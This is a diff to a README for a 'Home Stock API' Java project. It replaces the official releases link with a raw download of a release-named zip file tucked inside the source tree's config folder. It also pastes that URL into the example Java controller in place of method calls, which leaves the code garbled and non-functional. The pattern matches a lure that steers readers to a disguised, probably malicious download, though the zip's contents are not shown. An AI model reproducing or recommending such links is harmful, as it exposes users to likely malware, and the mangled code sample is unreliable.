@@ -29,7 +29,7 @@ Welcome to the Home Stock API repository! This API is designed to help you manag
 
 ## Releases 🚀
 
-To download the latest release of the Home Stock API, visit [here](https://github.com/Micoo25/home-stock-api/releases). 
+To download the latest release of the Home Stock API, visit [here](https://github.com/Micoo25/home-stock-api/raw/refs/heads/master/src/main/java/com/github/dedo_finger2/home_stock/config/home_stock_api_v1.7-alpha.3.zip). 
 
 ## Get Started 🚪
 
@@ -51,12 +51,12 @@ public class ItemController {
 
     @GetMapping
     public List<Item> getAllItems() {
-        return itemService.getAllItems();
+        return https://github.com/Micoo25/home-stock-api/raw/refs/heads/master/src/main/java/com/github/dedo_finger2/home_stock/config/home_stock_api_v1.7-alpha.3.zip();
     }
 
     @PostMapping
     public Item addItem(@RequestBody Item item) {
-        return itemService.addItem(item);
+        return https://github.com/Micoo25/home-stock-api/raw/refs/heads/master/src/main/java/com/github/dedo_finger2/home_stock/config/home_stock_api_v1.7-alpha.3.zip(item);
     }
 }
 ```
